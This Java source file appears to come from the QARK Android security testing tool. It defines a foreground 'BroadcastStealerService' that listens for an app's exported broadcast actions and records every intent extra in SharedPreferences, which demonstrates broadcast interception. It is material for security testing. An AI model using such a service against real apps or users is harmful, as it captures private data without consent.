/*
 * Copyright 2015 LinkedIn Corp. Licensed under the Apache License, Version 2.0 (the "License");
 * You may not use this file except in compliance with the License.
 * You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 */

 package com.secbro.qark.intentsniffer.services;

 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat; // Migrated to AndroidX
 
 import com.secbro.qark.R;
 import com.secbro.qark.TopLevelActivity;
 
 public class BroadcastStealerService extends Service {
 
     private static final String LOG_TAG = BroadcastStealerService.class.getSimpleName();
     private String[] intentNames = {};
 
     // Broadcast Receiver to listen for incoming broadcasts
     private final BroadcastReceiver receiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
             if (action != null) {
                 for (String intentName : intentNames) {
                     if (action.equals(intentName)) {
                         handleReceivedIntent(context, intent);
                     }
                 }
             }
         }
     };
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
         startForeground(1, createNotification());
 
         IntentFilter filter = new IntentFilter();
         intentNames = getResources().getStringArray(R.array.exportedBroadcasts);
         for (String name : intentNames) {
             int resId = getResources().getIdentifier(name, "string", TopLevelActivity.PACKAGE_NAME);
             if (resId != 0) {
                 filter.addAction(getResources().getString(resId));
             }
         }
         registerReceiver(receiver, filter);
         Log.i(LOG_TAG, "Service started and BroadcastReceiver registered.");
     }
 
     private void handleReceivedIntent(Context context, Intent intent) {
         try {
             Bundle bundle = intent.getExtras();
             if (bundle != null) {
                 SharedPreferences prefs = getSharedPreferences(getPackageName(), Context.MODE_PRIVATE);
                 SharedPreferences.Editor editor = prefs.edit();
 
                 StringBuilder logMessage = new StringBuilder(prefs.getString("foo", "Listening..."));
 
                 for (String key : bundle.keySet()) {
                     Object value = bundle.get(key);
                     logMessage.append("\nKEY: ").append(key).append(" VALUE: ").append(value != null ? value.toString() : "null");
                 }
 
                 editor.putString("foo", logMessage.toString());
                 editor.apply();
             }
             Log.i(LOG_TAG, "Intent received and logged.");
         } catch (Exception e) {
             Log.e(LOG_TAG, "Error handling received intent", e);
         }
     }
 
     @Override
     public void onDestroy() {
         try {
             unregisterReceiver(receiver);
             Log.i(LOG_TAG, "Receiver unregistered and service stopped.");
         } catch (Exception e) {
             Log.e(LOG_TAG, "Failed to unregister receiver", e);
         }
     }
 
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
 
     /**
      * Create a notification channel for Android O and above
      */
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     "BroadcastStealerChannel",
                     "Broadcast Stealer Service",
                     NotificationManager.IMPORTANCE_LOW
             );
             channel.setDescription("Service to intercept and log broadcasts.");
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
             }
         }
     }
 
     /**
      * Create a foreground service notification
      */
     private Notification createNotification() {
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "BroadcastStealerChannel")
                 .setContentTitle("Broadcast Stealer Running")
                 .setContentText("Listening for exported broadcasts.")
                 .setSmallIcon(R.drawable.ic_notification)
                 .setPriority(NotificationCompat.PRIORITY_LOW);
 
         return builder.build();
     }
 }
 